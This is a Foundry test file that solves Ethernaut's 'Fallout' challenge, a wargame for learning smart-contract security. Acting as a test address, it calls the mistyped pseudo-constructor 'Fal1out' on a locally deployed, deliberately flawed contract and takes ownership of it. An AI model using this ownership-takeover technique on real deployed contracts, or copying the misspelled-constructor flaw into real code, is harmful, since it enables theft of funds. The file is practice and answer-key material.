// SPDX-License-Identifier: MIT
// Code from: https://github.com/abdulsamijay/ethernaut/blob/master/src/Challenge-2-Fallout/test/Fallout.t.sol

pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "../Fallout.sol";

contract ContractTest is Test {
  Fallout fallout;

  function test_challenge_2() public {
    console.log("Challenge #2");

    fallout = new Fallout();

    console.log("The owner of the contract", fallout.owner());

    deal(address(1337), 1 ether);
    vm.startPrank(address(1337));
    fallout.Fal1out{ value: 0.01 ether }();
    console.log("The owner of the contract", fallout.owner());
    vm.stopPrank();
  }
}
